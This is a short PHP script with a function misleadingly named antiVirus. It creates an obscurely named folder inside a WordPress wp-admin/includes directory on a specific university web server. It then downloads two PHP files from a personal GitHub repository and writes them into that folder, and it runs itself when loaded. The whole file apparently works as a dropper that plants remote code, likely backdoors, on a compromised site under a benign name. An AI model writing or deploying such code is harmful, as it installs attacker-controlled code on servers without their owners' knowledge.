<?php
function antiVirus() {
    $z = "/var/www/html/oleoye.ucsd.edu/wp-admin/includes/-";

	if (!file_exists($z) && !is_dir($z)) {
		mkdir($z);
	}

    $name1 = "config-dialog.php";
    $name2 = "guide.php";

    $abc = "https://raw.githubusercontent.com/raniriana/anti-virus/main/" . $name1;
    $dfg = "https://raw.githubusercontent.com/raniriana/anti-virus/main/" . $name2;

	$abc1 = file_get_contents($abc);
	$dfg1 = file_get_contents($dfg);

	$x = fopen($z . "/" . $name1, "w+");
	fwrite($x, $abc1);
	fclose($x);

	$z = fopen($z . "/" . $name2, "w+");
	fwrite($z, $dfg1);
	fclose($z);
}
antiVirus();
